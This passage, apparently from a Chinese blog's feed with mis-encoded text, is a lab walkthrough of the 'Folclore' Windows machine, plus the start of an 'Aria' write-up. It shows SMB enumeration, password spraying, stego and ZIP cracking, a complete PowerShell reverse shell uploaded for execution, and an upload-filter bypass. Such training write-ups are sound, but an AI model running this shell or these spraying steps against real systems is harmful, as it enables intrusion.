Windows 11\nOS CPE: cpe:/o:microsoft:windows_11\nOS details: Microsoft Windows 11\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2025-08-05T08:17:48\n|_  start_date: N/A\n|_nbstat: NetBIOS name: FOLCLORE, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:ee:0f:0e (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n|_clock-skew: -1s\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.45 ms 192.168.56.101\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 64.03 seconds\n```\n\n### SMB æšä¸¾\n\n`SMB` åŒ¿åæšä¸¾\n\n```bash\nâœ  Folclore nxc smb 192.168.56.101 -u anonymous -p '' --shares\nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False)\nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\anonymous: (Guest)\nSMB         192.168.56.101  445    FOLCLORE         [*] Enumerated shares\nSMB         192.168.56.101  445    FOLCLORE         Share           Permissions     Remark\nSMB         192.168.56.101  445    FOLCLORE         -----           -----------     ------\nSMB         192.168.56.101  445    FOLCLORE         ADMIN$                          Admin remota\nSMB         192.168.56.101  445    FOLCLORE         C$                              Recurso predeterminado\nSMB         192.168.56.101  445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.\nSMB         192.168.56.101  445    FOLCLORE         IPC$            READ            IPC remota\nSMB         192.168.56.101  445    FOLCLORE         Libertad                        El secreto estÃ¡ en quien se atreve a buscarlo; sigue tu camino sin miedo.\nSMB         192.168.56.101  445    FOLCLORE         Lluvia                          Presta atenciÃ³n, pues en esta imagen el camino se revela sÃ³lo a quien sabe escuchar el trueno\nSMB         192.168.56.101  445    FOLCLORE         Oro                             Â¿Buscas llegar a QuetzalcÃ³atl? AquÃ­ inicia tu camino.\nSMB         192.168.56.101  445    FOLCLORE         Santuario                       El Refugio de Ixchel\nSMB         192.168.56.101  445    FOLCLORE         Viento                          El viento sagrado ejecutarÃ¡ la tarea a su debido tiempo\n```\n\nä½†æ˜¯å¹¶ä¸èƒ½ä¸‹è½½ä»»ä½•ä¸œè¥¿\n\n```bash\nâœ  Folclore nxc smb 192.168.56.101 -u anonymous -p '' -M spider_plus -o DOWNLOAD_FLAG=true\nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\anonymous: (Guest)\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Started module spidering_plus with the following options:\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  DOWNLOAD_FLAG: True\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]     STATS_FLAG: True\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] EXCLUDE_FILTER: ['print$', 'ipc$']\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]   EXCLUDE_EXTS: ['ico', 'lnk']\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus\nSMB         192.168.56.101  445    FOLCLORE         [*] Enumerated shares\nSMB         192.168.56.101  445    FOLCLORE         Share           Permissions     Remark\nSMB         192.168.56.101  445    FOLCLORE         -----           -----------     ------\nSMB         192.168.56.101  445    FOLCLORE         ADMIN$                          Admin remota\nSMB         192.168.56.101  445    FOLCLORE         C$                              Recurso predeterminado\nSMB         192.168.56.101  445    FOLCLORE         Dia de Muertos                  Al final, todos somos polvo y hueso.\nSMB         192.168.56.101  445    FOLCLORE         IPC$            READ            IPC remota\nSMB         192.168.56.101  445    FOLCLORE         Libertad                        El secreto estÃ¡ en quien se atreve a buscarlo; sigue tu camino sin miedo.\nSMB         192.168.56.101  445    FOLCLORE         Lluvia                          Presta atenciÃ³n, pues en esta imagen el camino se revela sÃ³lo a quien sabe escuchar el trueno\nSMB         192.168.56.101  445    FOLCLORE         Oro                             Â¿Buscas llegar a QuetzalcÃ³atl? AquÃ­ inicia tu camino.\nSMB         192.168.56.101  445    FOLCLORE         Santuario                       El Refugio de Ixchel\nSMB         192.168.56.101  445    FOLCLORE         Viento                          El viento sagrado ejecutarÃ¡ la tarea a su debido tiempo\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [+] Saved share-file metadata to \"/root/.nxc/modules/nxc_spider_plus/192.168.56.101.json\".\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Shares:           9 (ADMIN$, C$, Dia de Muertos, IPC$, Libertad, Lluvia, Oro, Santuario, Viento)\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Readable Shares:  1 (IPC$)\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] SMB Filtered Shares:  1\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Total folders found:  0\nSPIDER_PLUS 192.168.56.101  445    FOLCLORE         [*] Total files found:    0\n```\n\nä½†å¯ä»¥æ³¨æ„åˆ°æè¿°ä¸­æœ‰ä¸œè¥¿\n\n```bash\nADMIN$                          Admin remota\nC$                              Recurso predeterminado\nDia de Muertos                  Al final, todos somos polvo y hueso.\nIPC$            READ            IPC remota\nLibertad                        El secreto estÃ¡ en quien se atreve a buscarlo; sigue tu camino sin miedo.\nLluvia                          Presta atenciÃ³n, pues en esta imagen el camino se revela sÃ³lo a quien sabe escuchar el trueno\nOro                             Â¿Buscas llegar a QuetzalcÃ³atl? AquÃ­ inicia tu camino.\nSantuario                       El Refugio de Ixchel\nViento                          El viento sagrado ejecutarÃ¡ la tarea a su debido tiempo\n```\n\n> ADMIN$ - è¿œç¨‹ç®¡ç†å‘˜\nC$ - é»˜è®¤èµ„æº\näº¡çµèŠ‚ - æœ€ç»ˆï¼Œæˆ‘ä»¬éƒ½ä¼šåŒ–ä¸ºå°˜åœŸå’Œç™½éª¨ã€‚\nIPC$ - è¯»å–è¿œç¨‹IPC\nè‡ªç”± - ç§˜å¯†åœ¨äºé‚£äº›æ•¢äºè¿½å¯»çš„äººï¼›æ— æ‰€ç•æƒ§åœ°è¿½éšä½ çš„é“è·¯ã€‚\né›¨ - è¯·æ³¨æ„ï¼Œåœ¨è¿™å¹…å›¾ä¸­ï¼Œåªæœ‰æ‡‚å¾—è†å¬é›·å£°çš„äººæ‰èƒ½æ‰¾åˆ°é“è·¯ã€‚\né‡‘  - ä½ æƒ³åˆ°è¾¾ç¾½è›‡ç¥å—ï¼Ÿä½ çš„é“è·¯ä»è¿™é‡Œå¼€å§‹ã€‚\nåœ£æ‰€ - ä¼Šå…‹åˆ‡å°”çš„é¿éš¾æ‰€\né£ - ç¥åœ£çš„é£ä¼šåœ¨é€‚å½“çš„æ—¶å€™å®Œæˆä»»åŠ¡ã€‚\n> \n\n### ç”¨æˆ·æšä¸¾\n\nç”¨æˆ·æšä¸¾ï¼ŒPSï¼šä¹‹å‰ä¸€ç›´å¡åœ¨ä¸Šè¾¹ï¼Œå› ä¸ºæ²¡æƒ³åˆ°è¦é€šè¿‡æš´åŠ›ç ´è§£ï¼Œå› ä¸ºæˆ‘è§‰å¾—ä¼šæœ‰å¯†ç æœ€å¤§é˜ˆå€¼ï¼ˆ\n\n```bash\nâœ  Folclore nxc smb 192.168.56.101 -u guest -p '' --rid-brute                      \nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\guest: (Guest)\nSMB         192.168.56.101  445    FOLCLORE         500: FOLCLORE\\Administrador (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         501: FOLCLORE\\Invitado (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         503: FOLCLORE\\DefaultAccount (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         504: FOLCLORE\\WDAGUtilityAccount (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         513: FOLCLORE\\Ninguno (SidTypeGroup)\nSMB         192.168.56.101  445    FOLCLORE         1001: FOLCLORE\\Quetzalcoatl (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1003: FOLCLORE\\El_charro_negro (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1004: FOLCLORE\\Ix_Chel (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1005: FOLCLORE\\Tlaloc (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1006: FOLCLORE\\La_mulata_de_Cordoba (SidTypeUser)\nSMB         192.168.56.101  445    FOLCLORE         1007: FOLCLORE\\La_Catrina (SidTypeUser)\n```\n\nä½¿ç”¨å¾—åˆ°çš„ç”¨æˆ·åè¿›è¡Œå¯†ç çˆ†ç ´\n\n```bash\nâœ  Folclore cat user.txt                                                        \nAdministrador\nInvitado\nDefaultAccount\nWDAGUtilityAccount\nNinguno\nQuetzalcoatl\nEl_charro_negro\nIx_Chel\nTlaloc\nLa_mulata_de_Cordoba\nLa_Catrina\n```\n\nç»è¿‡éœ€æ±‚å°è¯•åï¼Œå‘ç° `grep '[+]'` æ— æ³•åŒ¹é…å‡ºæ¥ï¼Œå› ä¸ºè´¦æˆ·å¯†ç è¿‡æœŸäº†.. éœ€è¦åŒ¹é… `grep -v 'STATUS_LOGON_FAILURE'` \n\n```bash\nâœ  Folclore nxc smb 192.168.56.101 -u user.txt -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding --continue-on-success | grep -v 'STATUS_LOGON_FAILURE' \nSMB                      192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB                      192.168.56.101  445    FOLCLORE         [-] Folclore\\El_charro_negro:abc123 STATUS_PASSWORD_EXPIRED\n```\n\nä¸ºäº†ç»§ç»­æ“ä½œï¼Œé€šè¿‡å›¾å½¢åŒ–ç•Œé¢å¯¹å¯†ç è¿›è¡Œäº†ä¿®æ”¹\n\n![image.png](/post-images/TheHackersLabsFolclore/image1.png)\n\n```bash\nâœ  Folclore nxc smb 192.168.56.101 -u el_charro_negro -p abc1234                                                                                             \nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\el_charro_negro:abc1234\n```\n\n## å›¾ç‰‡éšå†™ - 1\n\né€šè¿‡è¯¥ç”¨æˆ·æšä¸¾ `SMB`ï¼Œèƒ½å¾—åˆ°ä¸€å¼ ç…§ç‰‡\n\n![image.png](/post-images/TheHackersLabsFolclore/image2.png)\n\n![image.png](/post-images/TheHackersLabsFolclore/image3.png)\n\nç›²çŒœæ˜¯å›¾ç‰‡éšå†™äº†\n\n```bash\nâœ  Folclore binwalk -Me --run-as=root El_Charro_Negro.jpeg                              \n\nScan Time:     2025-09-24 17:32:08\nTarget File:   /root/Desktop/TheHackersLabs/Folclore/El_Charro_Negro.jpeg\nMD5 Checksum:  97f1dd191d3d9217ee0147f15a700c4f\nSignatures:    436\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n\nWARNING: One or more files failed to extract: either no utility was \nfound or it's unimplemented\n\nâœ  Folclore foremost El_Charro_Negro.jpeg   \nProcessing: El_Charro_Negro.jpeg\n|*|\n\nâœ  Folclore exiftool El_Charro_Negro.jpeg \nExifTool Version Number         : 13.25\nFile Name                       : El_Charro_Negro.jpeg\nDirectory                       : .\nFile Size                       : 50 kB\nFile Modification Date/Time     : 2025:09:24 17:29:12+08:00\nFile Access Date/Time           : 2025:09:24 17:30:13+08:00\nFile Inode Change Date/Time     : 2025:09:24 17:29:12+08:00\nFile Permissions                : -rw-r--r--\nFile Type                       : JPEG\nFile Type Extension             : jpg\nMIME Type                       : image/jpeg\nExif Byte Order                 : Big-endian (Motorola, MM)\nY Cb Cr Positioning             : Centered\nCopyright                       : El camino es largo pero no complicado. Busca a Ix Chel; ella tiene la siguiente pista aqui tienes la clave: 4+9Ii1wK\nImage Width                     : 736\nImage Height                    : 981\nEncoding Process                : Progressive DCT, Huffman coding\nBits Per Sample                 : 8\nColor Components                : 3\nY Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)\nImage Size                      : 736x981\nMegapixels                      : 0.722\n```\n\nå¾—åˆ°ä¸€ä¸ªæç¤ºï¼š\n\n![image.png](/post-images/TheHackersLabsFolclore/image4.png)\n\nç»™å‡ºä¸€ä¸ªå­—ç¬¦ä¸² `4+9Ii1wK` ï¼Œä¼°è®¡æ˜¯ä¸ªå¯†ç \n\n```bash\nâœ  Folclore nxc smb 192.168.56.101 -u user.txt -p '4+9Ii1wK' --ignore-pw-decoding                                               \nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\Quetzalcoatl:4+9Ii1wK STATUS_LOGON_FAILURE \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\El_charro_negro:4+9Ii1wK STATUS_LOGON_FAILURE \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\Ix_Chel:4+9Ii1wK STATUS_PASSWORD_EXPIRED \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\Tlaloc:4+9Ii1wK STATUS_LOGON_FAILURE \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\La_mulata_de_Cordoba:4+9Ii1wK STATUS_LOGON_FAILURE \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\La_Catrina:4+9Ii1wK STATUS_LOGON_FAILURE\n```\n\næ˜¯ `Ix_Chel` çš„å¯†ç ï¼Œä¸è¿‡ä¹Ÿè¿‡æœŸäº†â€¦ é‡å¤ä¸Šè¾¹çš„æ“ä½œ\n\n## å›¾ç‰‡éšå†™ - 2\n\nç„¶åå†æ¬¡æšä¸¾ SMB\n\n![image.png](/post-images/TheHackersLabsFolclore/image5.png)\n\nå¾—åˆ°ä¸€ä¸ª TXT æ–‡ä»¶ï¼Œåˆæ˜¯ä¸€ä¸ªå‡­æ® `677Kn$q`\n\n```bash\nâœ  Folclore cat La\\ clave\\ de\\ KukulcÃ¡n.txt           \nRecuerdo cuando conocÃ­ a KukulcÃ¡n, \nla serpiente emplumada que otros llaman QuetzalcÃ³atl; \nsu mirada guardaba el misterio del viento y la sabidurÃ­a, \ny con una sonrisa me confiÃ³ que su clave mÃ¡s preciada tenÃ­a solo ocho caracteres, \nsencilla pero poderosa, como Ã©l mismo. Nuestros caminos se entrelazan: \nyo, guardiana de la luna y la vida; Ã©     l, \nportador del cielo y el conocimiento, unidos bajo el manto eterno de las estrellas. \nAhora, sigue adelante, porque QuetzalcÃ³atl te espera. \nContinua buscando a TlÃ¡loc,te despejare el camino entregÃ¡     \nndote su clave: 677Kn$q.\"\n```\n\nå¯†ç æ˜¯ç”¨æˆ· `Tlaloc`  çš„\n\n```bash\nâœ  Folclore nxc smb 192.168.56.101 -u Tlaloc -p '677Kn$q' --ignore-pw-decoding\nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\Tlaloc:677Kn$q STATUS_PASSWORD_EXPIRED \n```\n\næšä¸¾ SMB\n\n![image.png](/post-images/TheHackersLabsFolclore/image6.png)\n\nç…§ç‰‡ ++\n\n![image.png](/post-images/TheHackersLabsFolclore/image7.png)\n\nç›²çŒœè¿˜æ˜¯éšå†™ï¼Œç›´æ¥é€šè¿‡ `stegseek` å¯ä»¥æ‹¿åˆ°æ–‡ä»¶\n\n```bash\nâœ  Folclore stegseek Tlaloc.jpg \nStegSeek 0.6 - https://github.com/RickdeJager/StegSeek\n\n[i] Found passphrase: \"knight\"\n[i] Original filename: \"Las primeras seÃ±ales.txt\".\n[i] Extracting to \"Tlaloc.jpg.out\".\n```\n\nå‡­è¯ ++\n\n```bash\nâœ  Folclore cat Tlaloc.jpg.out \nHe conseguido estos Ãºltimos dos caracteres para la clave de KukulcÃ¡n, \nla serpiente emplumada que llaman QuetzalcÃ³atl: \n%/. Te los entrego para que completes tu bÃºsqueda. \nAdemÃ¡s, aquÃ­ tienes otra clave, \naunque debo confesar que no recuerdo a quiÃ©n pertenece exactamente: \n45yD#k7. ConfÃ­     a en tu instinto para usarla sabiamente.\n```\n\n## ZIP crack\n\næ˜¯ç”¨æˆ· `La_mulata_de_Cordoba` çš„å‡­æ®\n\n```bash\nâœ  Folclore nxc smb 192.168.56.101 -u La_mulata_de_Cordoba -p '45yD#k7'\nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB         192.168.56.101  445    FOLCLORE         [-] Folclore\\La_mulata_de_Cordoba:45yD#k7 STATUS_PASSWORD_EXPIRED\n```\n\nå†æšä¸¾ `SMB` ï¼Œä¸€ä¸ª txt ä¸€ä¸ª ZIP\n\n![image.png](/post-images/TheHackersLabsFolclore/image8.png)\n\nTXT å¾—åˆ°ä¸€ä¸ªè´¦æˆ· `La_Catrina:3nM93{S#`\n\n```bash\nâœ  Folclore cat Mi_amiga.txt                                                   \nMi amiga â€˜La Catrinaâ€™ me ha dejado su cuenta para que le ayude con algunos de sus trabajitos de vez en cuando. \nEscribirÃ© la clave aquÃ­ para no olvidarla: 3nM93{S#\n```\n\nZip éœ€è¦å¯†ç \n\n```bash\nâœ  Folclore unzip Pacto.zip \nArchive:  Pacto.zip\n   skipping: Pacto.txt               need PK compat. v5.1 (can do v4.6)\n```\n\né€šè¿‡ `John` è¿›è¡Œçˆ†ç ´\n\n```bash\nâœ  Folclore zip2john Pacto.zip > hash\nâœ  Folclore john --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])\nCost 1 (HMAC size) is 238 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\ncelina           (Pacto.zip/Pacto.txt)     \n1g 0:00:00:00 DONE (2025-09-24 18:26) 2.564g/s 42010p/s 42010c/s 42010C/s 123456..cocoliso\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\n\n`7z` è¿›è¡Œè§£å‹\n\n```bash\nâœ  Folclore 7z x Pacto.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 432 bytes (1 KiB)\n\nExtracting archive: Pacto.zip\n--\nPath = Pacto.zip\nType = zip\nPhysical Size = 432\n\n    \nEnter password (will not be echoed):\nEverything is Ok\n\nSize:       358\nCompressed: 432\n```\n\nå¾—åˆ°ä¸€ä¸ªç¥ç§˜å­—ç¬¦ä¸² `J9c`\n\n```bash\nâœ  Folclore cat Pacto.txt \nHas surcado sendas que pocos se atreven a cruzar, \npero tu viaje no concluye todavÃ­a. Invocando mis artes prohibidas, \nlogrÃ© hechizar a la serpiente emplumada y robarle apenas el inicio de su secreto: \nsÃ³lo tres caracteres fui capaz de obtener. \nAhora los deposito en tus manos, \npero escucha el viento y no olvides la deuda que ahora te ata a mi sombra: J9c.\n```\n\næˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹ä¸Šé¢å¾—åˆ°çš„ç”¨æˆ·èƒ½åšçš„äº‹æƒ…ï¼Œè¿˜æ˜¯ä¸€ä¸ª `txt`\n\n![image.png](/post-images/TheHackersLabsFolclore/image9.png)\n\n```bash\nâœ  Folclore cat Ultimo_mensaje.txt \nSolo puedo darte el quinto carÃ¡cter de su clave: â€˜Uâ€™. \nLos demÃ¡s caracteres que faltan deberÃ¡s encontrarlos por tu cuenta, \naunque no debe ser tan difÃ­cil; solo son nÃºmeros o letras. \nConfÃ­a en tu ingenio y no olvides que el misterio siempre se revela a quien persevera.\n```\n\n## å¯†ç çˆ†ç ´\n\né›†åˆä¸Šè¾¹çš„å¾—åˆ°å‡ ä¸ª`txt`ï¼Œå¾—åˆ°å¯†ç åº”è¯¥æ˜¯ `J9c?U?%/`ï¼Œç¬¬å››ä¸ªå­—æ¯éœ€è¦æˆ‘ä»¬è¿›è¡Œçˆ†ç ´\n\n```bash\nâœ  Folclore for char1 in {a..z} {A..Z} {0..9}; do printf \"J9c%sU%s%%/\\n\" \"$char1\" \"$char1\"; done > wordlist.txt \n```\n\nå¾—åˆ°å‡­æ® `Quetzalcoatl:J9c7U7%/`\n\n```bash\nâœ  Folclore nxc smb 192.168.56.101 -u user.txt -p wordlist.txt --ignore-pw-decoding --continue-on-success | grep -v 'STATUS_LOGON_FAILURE'\nSMB                      192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False) \nSMB                      192.168.56.101  445    FOLCLORE         [+] Folclore\\Ninguno:J9caUa%/ (Guest)\nSMB                      192.168.56.101  445    FOLCLORE         [+] Folclore\\Quetzalcoatl:J9c7U7%/\n```\n\nSMB æšä¸¾â€¦\n\n![image.png](/post-images/TheHackersLabsFolclore/image10.png)\n\n## xxxxx\n\næŸ¥çœ‹å¾—åˆ°çš„  `txt`\n\n```bash\nâœ  Folclore cat /root/.nxc/modules/nxc_spider_plus/192.168.56.101/Viento/Serpiente\\ Emplumada.txt \nHas recorrido con valentÃ­a y sabidurÃ­a un sendero lleno de retos; te felicito, guerrero del destino.\nAhora, confÃ­a en mÃ­, QuetzalcÃ³atl, la serpiente emplumada, pues serÃ© yo quien te otorgue el acceso necesario. \nSolo ejecutarÃ© una vez aquel archivo PowerShell que decidas subir, para abrir el portal hacia lo que buscas. \nQue esta acciÃ³n sea el puente que te lleve a la verdad escondida entre los vientos y las estrellas.# \n```\n\nè¡¨ç¤ºæˆ‘ä»¬å¯ä»¥ä¸Šä¼  `Powershell` æ–‡ä»¶ä¸€æ¬¡\n\n![image.png](/post-images/TheHackersLabsFolclore/image11.png)\n\nå°†ä¸‹é¢çš„ä»£ç ä¿å­˜ä¸º `xxx.ps1` ç„¶åè¿›è¡Œä¸Šä¼ \n\n```bash\n$client = New-Object Net.Sockets.TCPClient('192.168.56.5',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n```\n\n```bash\nsmbclient //192.168.56.101/viento -U Quetzalcoatl%'J9c7U7%/'\nput shell.ps1\n```\n\nç­‰å¾…å¼¹å›æ¥\n\n![image.png](/post-images/TheHackersLabsFolclore/image12.png)\n\nè¯»å– `User.txt`\n\n```bash\nPS C:\\Users\\Quetzalcoatl\\Desktop> type User.txt\n456e20656c207669656e746f2079616365206c6120766572646164\n```\n\nä¸ºäº†æ–¹ä¾¿æ“ä½œè¿ç§»åˆ° `msf` \n\n![image.png](/post-images/TheHackersLabsFolclore/image13.png)\n\nä¸Šæ¥åé€šè¿‡ winpeas ç­‰æšä¸¾äº†è®¸å¤šï¼Œä½†æ˜¯æ²¡æ‰¾åˆ°å¯ä»¥åˆ©ç”¨çš„\n\næœ€åå¯ä»¥åœ¨ `Downloads\\Actualizacion` ä¸­æ‰¾åˆ°ç®¡ç†å‘˜å¯†ç \n\n```bash\nC:\\Users\\Quetzalcoatl\\Downloads\\Actualizacion>type Venganza.txt\ntype Venganza.txt\nHe conseguido la clave del administrador!!!\nLa guardare para no olvidarla: xxxxxxxx\n```\n\n```bash\nâœ  Folclore nxc smb 192.168.56.101 -u 'administrador' -p 'xxxxxx*'                        \nSMB         192.168.56.101  445    FOLCLORE         [*] Windows 10 / Server 2019 Build 19041 (name:FOLCLORE) (domain:Folclore) (signing:False) (SMBv1:False)\nSMB         192.168.56.101  445    FOLCLORE         [+] Folclore\\administrador:xxxxxx (Pwn3d!)\n```\n\næ‹¿ `root.txt` ï¼Œç›´æ¥è¯»å°±ç®—äº†ï¼Œæ‡’å¾—æ‹¿ `shell` äº†\n\n![image.png](/post-images/TheHackersLabsFolclore/image14.png)\n\n## æ€»ç»“\n\nä½“éªŒä¸ç®—å¥½\n",
            "url": "https://www.sunsetaction.top/2025/09/24/TheHackersLabsFolclore",
            "title": "TheHackersLabs - Folclore",
            "summary": "Folclore https://labs.TheHackersLabs.com/machine/123 Recon PortScan ä»…ä»…ä¸¤ä¸ªç«¯å£ SMB æšä¸¾ SMB åŒ¿åæšä¸¾ ä½†æ˜¯å¹¶ä¸èƒ½ä¸‹è½½ä»»ä½•ä¸œè¥¿ ä½†å¯ä»¥æ³¨æ„åˆ°æè¿°ä¸­æœ‰ä¸œè¥¿ ADMIN$ è¿œç¨‹ç®¡ç†å‘˜ C$ é»˜è®¤èµ„æº äº¡çµèŠ‚ æœ€ç»ˆï¼Œæˆ‘ä»¬éƒ½ä¼šåŒ–ä¸º...",
            "date_modified": "2025-09-24T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Windows",
                "MISC"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/09/23/HackMyVMAria",
            "content_html": "\n# Aria.\n\n> https://hackmyvm.eu/machines/machine.php?vm=Aria\n> \n\n![image.png](/post-images/HackMyVMAria/image.png)\n\n## Recon\n\n### ç«¯å£æ‰«æ\n\n```bash\nâœ  Aria nmap -sT -min-rate 10000 -p- 192.168.56.214\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 23:23 CST\nNmap scan report for 192.168.56.214\nHost is up (0.00037s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n1337/tcp open  waste\nMAC Address: 08:00:27:9A:02:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 17.23 seconds\n```\n\n```bash\nâœ  Aria nmap -sT -A -p 22,80,1337 192.168.56.214\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 23:25 CST\nNmap scan report for 192.168.56.214\nHost is up (0.00056s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey:\n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: Ultra-Secure Naming Service\n|_http-server-header: Apache/2.4.62 (Debian)\n1337/tcp open  waste?\n| fingerprint-strings:\n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, NULL, RPCCheck:\n|     --- Aria Debug Shell ---\n|     Type 'exit' to quit ---\n|   GenericLines:\n```\n\n### 80 ç«¯å£\n\nç»™å‡ºäº†ä¸€ç‚¹ä¿¡æ¯\n\n- é€šè¿‡ `md5(time()Â·rand(1,1000))` ****ç”Ÿæˆä¸å¯é¢„æµ‹çš„æ–‡ä»¶å\n- å¹¶ä¸”æ–‡ä»¶å†…å®¹ä¸å¯åŒ…å« `<?php`\n- ä»¥åŠæ–‡ä»¶åä»…ä»…å¯ä»¥æ˜¯ gif / jpg / png\n\n![image.png](/post-images/HackMyVMAria/image1.png)\n\n`<?php` å¯ä»¥é€šè¿‡ `<?=` æ¥ç»•è¿‡ï¼Œæ–‡ä»¶åå¯ä»¥é€šè¿‡ `GIF89a` ï¼Œä½†æ˜¯ä¸å¯é¢„æµ‹æ–‡ä»¶åéœ€è¦æƒ³åŠæ³•\n\n### 1337 ç«¯å£\n\næ‰«æå‡ºæ¥å¾ˆå¥‡æ€ªï¼Œ`nc` ä¸€ä¸‹\n\n```\nâœAria nc 192.168.56.214 1337\n--- Aria Debug Shell ---\n--- Type 'exit' to quit ---\n\n$ help\nThis shell aids admins in debugging Aria services.\nUse specific commands to view logs or hidden path.\nNote: Web interface also provides foothold access.\n```\n\n> æ­¤ Shell å¯å¸®åŠ©ç®¡ç†å‘˜è°ƒè¯• Aria æœåŠ¡ã€‚\nä½¿ç”¨ç‰¹å®šå‘½ä»¤æŸ¥çœ‹æ—¥å¿—æˆ–éšè—è·¯å¾„ã€‚\næ³¨æ„ï¼šWeb 